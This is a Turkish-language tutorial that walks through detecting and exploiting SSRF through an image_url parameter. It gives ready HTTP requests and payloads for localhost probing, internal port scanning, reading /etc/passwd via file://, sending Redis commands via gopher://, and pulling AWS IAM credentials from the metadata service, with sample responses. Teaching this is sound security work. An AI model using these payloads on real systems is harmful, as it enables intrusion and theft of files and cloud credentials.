SSRF zafiyetini tespit etme ve sömürme süreci, genellikle sunucunun dış kaynaklardan veri aldığı bir girdi noktasını manipüle etmeyi içerir. Bu süreç, adım adım ilerleyerek zafiyetin varlığını doğrulamaktan iç ağdaki sistemlere erişmeye kadar uzanabilir.

Adım 1: Zafiyetli Girdi Noktasını Tanımlama

İlk adım, uygulamanın kullanıcıdan bir URL veya IP adresi alarak sunucu tarafında bir istek yaptığı bir parametre bulmaktır. Bu genellikle bir resim yükleme, dosya içe aktarma veya webhook yapılandırma gibi özelliklerde bulunur.

Örnek olarak, bir web sitesinin başka bir URL'den resim yüklemesine olanak tanıyan bir

image_url

parametresi olduğunu varsayalım.

**Normal İstek:** Uygulamanın normal çalışması sırasında, kullanıcı meşru bir resim URL'si sağlar.

GET /loadImage?image_url=https://external-site.com/image.png

```auto
GET /loadImage?image_url=https://external-site.com/image.png HTTP/1.1
Host: vulnerable-site.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
```

**Normal Cevap:** Sunucu, belirtilen URL'deki resmi başarıyla getirir ve kullanıcıya gösterir.

HTTP/1.1 200 OK

```auto
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 15234

[PNG image data...]
```

Adım 2: Temel SSRF Testi

Zafiyetin varlığını test etmek için en temel yöntem, sunucunun kendisine (

localhost

) istek yapmasını sağlamaktır.

**Payload'lı İstek:**

image_url

parametresine

localhost

veya

127.0.0.1

adresi verilir.

GET /loadImage?image_url=http://127.0.0.1/

```auto
GET /loadImage?image_url=http://127.0.0.1/ HTTP/1.1
Host: vulnerable-site.com
...
```

GET /loadImage?image_url=https://google.com

```auto
GET /loadImage?image_url=https://google.com HTTP/1.1
Host: vulnerable-site.com
...
```

**Olası Cevaplar ve Analizi:**

1. **Başarılı Cevap:** Sunucu, kendi üzerinde çalışan bir servisin (örneğin, bir Apache "It works!" sayfası veya bir yönetim paneli giriş sayfası) HTML içeriğini döndürebilir. Bu, zafiyetin varlığını kesin olarak doğrular.
    
    HTTP/1.1 200 OK
    
    ```auto
    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Length: 45
    
    <html><body><h1>It works!</h1></body></html>
    ```
    
    HTTP/1.1 200 OK
    
    ```auto
    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Length: 45
    
    <html><body><h1>Google</h1></body></html>
    ```
    
2. **Hata Mesajı:** "Connection refused", "Invalid file format" gibi hatalar alabilirsiniz. Bu hatalar bile zafiyetin bir göstergesi olabilir. Çünkü sunucu,
    
    localhost
    
    'a bağlanmaya çalışmış ancak ya port kapalı olduğu için ya da dönen içerik beklenen format (örn: resim) olmadığı için hata vermiştir. Cevapların zamanlaması veya içeriğindeki küçük farklar, zafiyetin varlığını anlamada kilit rol oynar.
    

Adım 3: İç Ağı ve Portları Tarama

Zafiyet doğrulandıktan sonra, saldırganlar sunucunun bulunduğu iç ağı tarayabilir. Bu, iç ağdaki diğer sunucuları, servisleri ve açık portları keşfetmek için kullanılır.

**Payload'lı İstek (Port Tarama):** Farklı port numaraları denenerek, iç ağda başka hangi web servislerinin çalıştığı test edilebilir. Örneğin,

8080

portu genellikle Apache Tomcat veya Jenkins gibi yönetim panelleri için kullanılır.

GET /loadImage?image_url=http://127.0.0.1:8080

```auto
GET /loadImage?image_url=http://127.0.0.1:8080 HTTP/1.1
Host: vulnerable-site.com
...
```

**Cevap Analizi:**

- **Açık Port (Web Servisi):** Eğer 
    
    8080
    
     portunda bir web servisi çalışıyorsa, uygulama muhtemelen bir HTML içeriği (örn: bir login sayfası, bir "Hoş Geldiniz" sayfası veya bir 401/403 hata sayfası) döndürür. Dönen cevap "Invalid image format" gibi bir hata olsa bile, cevabın içeriği veya boyutu, kapalı bir porttan gelen cevaptan farklı olacaktır. Bu fark, portun açık ve bir servis tarafından kullanıldığını gösterir.
- **Kapalı Port:** "Connection refused" gibi bir hata alınır.
- **Filtrelenmiş Port:** İstek zaman aşımına uğrar (timeout).

Bu yöntemle,

192.168.1.x

,

10.0.x.x

gibi yaygın iç ağ aralıkları taranabilir.

Adım 4: Farklı URL Şemalarını Kullanma

SSRF zafiyetleri yalnızca

http://

ve

https://

ile sınırlı değildir. Sunucunun kullandığı kütüphaneye bağlı olarak başka URL şemaları da kullanılabilir.

- **file:///**
    
    **ile Yerel Dosyaları Okuma:** Bu şema, sunucunun dosya sistemindeki dosyaları okumak için kullanılır.
    
    **Payload:**
    
    file:///etc/passwd
    
    **İstek:**
    
    GET /loadImage?image_url=file:///etc/passwd
    
    **Cevap:**
    
    HTTP/1.1 200 OK
    
    ```auto
    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 748
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...
    ```
    
- **gopher://**
    
    **ile Karmaşık İstekler Gönderme:**
    
    gopher://
    
    şeması, TCP üzerinden ham veri göndermek için kullanılır ve bu da onu son derece güçlü kılar. Bu şema ile Redis, SMTP veya veritabanı gibi birçok servise özel komutlar gönderilebilir.
    
    **Örnek (Redis'e Komut Gönderme):** Redis gibi anahtar-değer deposu olan servislere komut göndererek RCE elde etmek mümkün olabilir. Aşağıdaki payload, Redis'e bir
    
    SET
    
    komutu gönderir. Gopher payload'ları URL-encode edilmelidir ve satır sonları için
    
    %0A
    
    kullanılır.
    
    **Payload:**
    
    gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
    
    **Payload'un Açıklaması:**
    
    Yukarıdaki payload, Redis'in kullandığı RESP (REdis Serialization Protocol) formatındadır. URL-encode edilmiş karakterler (
    
    %0d%0a
    
    ->
    
    \r\n
    
    ) açıldığında payload şu komutları içerir:
    
    ```auto
    *3         # Komutun 3 bölümden oluştuğunu belirtir (SET, key, value)
    $3         # İlk bölümün (SET) 3 byte uzunluğunda olduğunu belirtir
    SET        # Komut
    $3         # İkinci bölümün (key) 3 byte uzunluğunda olduğunu belirtir
    key        # Anahtar
    $5         # Üçüncü bölümün (value) 5 byte uzunluğunda olduğunu belirtir
    value      # Değer
    ```
    
    gopher://
    
    şeması bu ham isteği doğrudan
    
    127.0.0.1
    
    adresindeki
    
    6379
    
    portuna (varsayılan Redis portu) gönderir. Bu sayede, web sunucusu Redis veritabanına
    
    SET key value
    
    komutunu çalıştırmış olur. URL'nin başındaki
    
    _
    
    karakteri,
    
    curl
    
    gibi istemcilerde ilk karakterin atlanmasını önlemek için bir dolgu karakteri olarak eklenir.
    
    **İstek:**
    
    GET /loadImage?image_url=gopher://...
    
    **Cevap:** Gopher istekleri genellikle tek yönlüdür, bu nedenle bir cevap beklenmez. Saldırının başarılı olup olmadığı başka yöntemlerle kontrol edilmelidir.
    

Adım 5: Bulut Ortamlarında SSRF

Uygulama AWS, Azure veya Google Cloud gibi bir bulut platformunda çalışıyorsa, SSRF zafiyeti çok daha tehlikeli olabilir. Tüm bu platformlar, çalışan sanal makine hakkında bilgi almak için yalnızca yerelden erişilebilen bir metadata servisine sahiptir.

**Payload (AWS Metadata Servisi):** Bu servis

169.254.169.254

IP adresinde çalışır ve geçici güvenlik kimlik bilgileri dahil olmak üzere hassas bilgiler içerir.

**İstek:**

GET /loadImage?image_url=http://169.254.169.254/latest/meta-data/iam/security...

```auto
GET /loadImage?image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
Host: vulnerable-site.com
...
```

**Cevap:** Sunucu, AWS IAM rolüne ait geçici kimlik bilgilerini (Access Key, Secret Key, Token) döndürür. Bu bilgilerle saldırgan, kurbanın bulut hesabına erişebilir.

HTTP/1.1 200 OK

```auto
HTTP/1.1 200 OK
Content-Type: application/json

{
  "Code" : "Success",
  "LastUpdated" : "2024-08-08T12:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "2024-08-08T18:00:00Z"
}
```
